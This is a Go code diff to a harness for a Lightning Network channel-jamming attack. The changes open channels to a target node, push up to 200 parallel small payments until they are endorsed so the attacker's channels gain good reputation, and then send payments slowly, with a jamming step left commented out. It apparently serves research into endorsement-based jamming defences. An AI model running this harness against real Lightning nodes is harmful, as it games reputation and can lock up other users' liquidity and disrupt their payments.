@@ -6,6 +6,7 @@ import (
 	"math"
 	"os"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"github.com/btcsuite/btcd/btcutil"
@@ -65,17 +66,16 @@ func main() {
 		select {
 		case <-interceptor.ShutdownChannel():
 		}
+		fmt.Println("Got shutdown Signal!")
 
-		ah.stop()
+		ah.stop(ctx)
 	}()
 
+	err = ah.doThings(ctx)
+	if err != nil {
+		fmt.Printf("Could do things: %v\n", err)
+	}
 	/*
-		err = ah.openChans(ctx)
-		if err != nil {
-			fmt.Printf("Could not open chans: %v\n", err)
-			os.Exit(1)
-		}
-
 		// TODO: should be able to do this at the same time by sending
 		// back and forth.
 
@@ -102,11 +102,14 @@ func main() {
 	// at A1. If this switches to unendorsed, then we know that the rep of
 	// target node is bad as seen by peer node (since there is no reason that
 	// the target node would change the rep of our good node, A2).
-	err = ah.hodlAndAssess(ctx)
-	if err != nil {
-		fmt.Printf("Could not hodl and asses: %v\n", err)
-		os.Exit(1)
-	}
+	/*
+		err = ah.hodlAndAssess(ctx)
+		if err != nil {
+			fmt.Printf("Could not hodl and asses: %v\n", err)
+			os.Exit(1)
+		}
+
+	*/
 
 	/*
 		err = ah.jam(ctx)
@@ -117,31 +120,14 @@ func main() {
 
 	*/
 
-	/*
-		fmt.Println("Cleaning up opened channels for all nodes")
-		if err := graph.CloseAllChannels(ctx, 0); err != nil {
-			fmt.Printf("Could not clean up node 0: %v\n", err)
-			os.Exit(1)
-		}
-
-		if err := graph.CloseAllChannels(ctx, 1); err != nil {
-			fmt.Printf("Could not clean up node 1: %v\n", err)
-			os.Exit(1)
-		}
-
-		if err := graph.CloseAllChannels(ctx, 2); err != nil {
-			fmt.Printf("Could not clean up node q: %v\n", err)
-			os.Exit(1)
-		}
-	*/
+	fmt.Println("Waiting for threads to shutdown")
 
 	wg.Wait()
-
-	fmt.Println("Waiting for threads to shutdown")
 	cancel()
-
 	jammer.wg.Wait()
 	graph.wg.Wait()
+
+	fmt.Println("Shutdown complete")
 }
 
 type attackHarness struct {
@@ -202,28 +188,71 @@ func newAttackHarness(ctx context.Context, target route.Vertex,
 	}, nil
 }
 
-func (h *attackHarness) stop() {
+func (h *attackHarness) doThings(ctx context.Context) error {
+
+	if err := h.openChans(ctx); err != nil {
+		return err
+	}
+
+	fmt.Println("Start building good rep...")
+
+	if err := h.buildReputation(ctx); err != nil {
+		return err
+	}
+
+	fmt.Println("Our channels have good reputation!")
+
+	if err := h.sendPaymentsSlowly(ctx); err != nil {
+		return err
+	}
+
+	// Send payments every few seconds.
+
+	return nil
+}
+
+func (h *attackHarness) stop(ctx context.Context) {
 	fmt.Println("attack harness stopping...")
 	defer fmt.Println("attack harness stopped")
+
+	/*
+		err := h.closeAllChans(ctx)
+		if err != nil {
+			fmt.Printf("could not close channels...: %v\n", err)
+		}
+	*/
 
 	close(h.quit)
 	h.wg.Wait()
 }
 
-func (h *attackHarness) chooseAndSetTargetPeer(ctx context.Context) error {
+func (h *attackHarness) closeAllChans(ctx context.Context) error {
+	fmt.Println("Cleaning up opened channels for all nodes")
+	if err := h.graph.CloseAllChannels(ctx, 0); err != nil {
+		return err
+	}
+
+	if err := h.graph.CloseAllChannels(ctx, 1); err != nil {
+		return err
+	}
+
+	if err := h.graph.CloseAllChannels(ctx, 2); err != nil {
+		return err
+	}
+
 	return nil
 }
 
 func (h *attackHarness) openChans(ctx context.Context) error {
-	chanCap := btcutil.Amount(100000000)
+	chanCap := btcutil.Amount(16777215)
 	_, err := h.graph.OpenChannel(ctx, OpenChannelReq{
 		Source:      0,
 		Dest:        h.targetNode.PubKey,
 		CapacitySat: chanCap,
+		PushAmt:     chanCap / 2,
 	})
 	if err != nil {
 		return err
-
 	}
 
 	fmt.Printf("opened channel with target node (%s) from a0\n", h.targetNode.Alias)
@@ -234,7 +263,7 @@ func (h *attackHarness) openChans(ctx context.Context) error {
 		Source:      1,
 		Dest:        h.targetPeerNode.PubKey,
 		CapacitySat: chanCap,
-		PushAmt:     chanCap - 100000,
+		PushAmt:     chanCap / 2,
 	})
 	if err != nil {
 		return err
@@ -248,6 +277,7 @@ func (h *attackHarness) openChans(ctx context.Context) error {
 		Source:      2,
 		Dest:        h.targetNode.PubKey,
 		CapacitySat: chanCap,
+		PushAmt:     chanCap / 2,
 	})
 	if err != nil {
 		return err
@@ -259,13 +289,80 @@ func (h *attackHarness) openChans(ctx context.Context) error {
 	return nil
 }
 
-// TODO:
-//   - do parallel quick sends for faster reputation building
-//   - send from self to self (on our chan to our chan) so that we dont have
-//     to compete with the good outgoing revenue of the target peer chan.
-//     ie, just keep sending back and forth from self to self on the direct
-//     channels we have with the peer.
-func (h *attackHarness) buildRep(ctx context.Context, sourceIdx int) error {
+func (h *attackHarness) buildReputation(ctx context.Context) error {
+	// Get current best block
+	_, height, err := h.Lnd2.ChainKit.GetBestBlock(ctx)
+	if err != nil {
+		return err
+	}
+
+	var mainWG sync.WaitGroup
+	sendUntilEndorsed := func(src, dst int) {
+		defer mainWG.Done()
+
+		var (
+			wg   sync.WaitGroup
+			done atomic.Bool
+
+			// Send a max of 200 payments in parallel.
+			semaphores = make(chan struct{}, 200)
+		)
+		for {
+			select {
+			case <-h.quit:
+				return
+			case semaphores <- struct{}{}:
+			}
+
+			// Once we have good reputation, exit.
+			if done.Load() {
+				break
+			}
+
+			wg.Add(1)
+			go func() {
+				defer wg.Done()
+				endorsed, err := h.sendGoodAndCheckEndorsed(
+					ctx, src, dst, height,
+				)
+				if err != nil {
+					fmt.Printf("error sending good "+
+						"payment: %v\n", err)
+				}
+
+				if endorsed {
+					done.Store(true)
+				}
+
+				select {
+				case <-h.quit:
+				case <-time.Tick(time.Millisecond * 10):
+				}
+
+				select {
+				case <-h.quit:
+				case <-semaphores:
+				}
+			}()
+		}
+
+		wg.Wait()
+	}
+
+	// Send good payments back and forth between A0 & A2 until both those
+	// channels with the target peer (A0->Target & A2->Target) have good
+	// reputation.
+	mainWG.Add(2)
+
+	go sendUntilEndorsed(0, 2)
+	go sendUntilEndorsed(2, 0)
+
+	mainWG.Wait()
+
+	return nil
+}
+
+func (h *attackHarness) sendPaymentsSlowly(ctx context.Context) error {
 	// Get current best block
 	_, height, err := h.Lnd2.ChainKit.GetBestBlock(ctx)
 	if err != nil {
@@ -276,38 +373,60 @@ func (h *attackHarness) buildRep(ctx context.Context, sourceIdx int) error {
 	// logs and see if our reputation (with our channel directly with the
 	// target node) starts increasing. Also watch the endorsement signal
 	// for the outgoing payment.
-	// TODO: write parallel quick sends thing.
+	source := 0
 	for {
-		fmt.Println("sending payment...")
-		resp, err := h.jammer.JammingPayment(ctx, JammingPaymentReq{
-			AmtMsat:         800000,
-			SourceIdx:       sourceIdx,
-			DestIdx:         1,
-			FinalCLTV:       uint64(height) + 80,
-			EndorseOutgoing: true,
-			Settle:          true,
-		})
+		if source == 0 {
+			source = 2
+		} else {
+			source = 0
+		}
+
+		_, err := h.sendGoodAndCheckEndorsed(
+			ctx, source, 1, height,
+		)
 		if err != nil {
 			return err
 		}
 
-		r := <-resp
-		if r.Err != nil {
-			return err
-		}
-
-		wasEndorsed := outgoingEndorsed(r.Htlcs)
-
-		fmt.Printf("endorsed on last hop (ie, we have good rep now?): %v\n", wasEndorsed)
-
 		select {
-		case <-interceptor.ShutdownChannel():
+		case <-h.quit:
 			return nil
-		default:
+		case <-time.Tick(time.Millisecond * 500):
 		}
 	}
+}
 
-	return nil
+func (h *attackHarness) sendGoodAndCheckEndorsed(ctx context.Context, src,
+	dst int, height int32) (bool, error) {
+
+	resp, err := h.jammer.JammingPayment(ctx, JammingPaymentReq{
+		AmtMsat:         80000,
+		SourceIdx:       src,
+		DestIdx:         dst,
+		FinalCLTV:       uint64(height) + 80,
+		EndorseOutgoing: true,
+		Settle:          true,
+	})
+	if err != nil {
+		return false, err
+	}
+
+	select {
+	case r := <-resp:
+		if r.Err != nil {
+			return false, r.Err
+		}
+
+		endorsed := outgoingEndorsed(r.Htlcs)
+
+		fmt.Printf("payment sent from A%d to A%d. Endorsed? %v\n", src,
+			dst, endorsed)
+
+		return endorsed, nil
+
+	case <-h.quit:
+		return false, fmt.Errorf("exited")
+	}
 }
 
 func (h *attackHarness) hodlAndAssess(ctx context.Context) error {
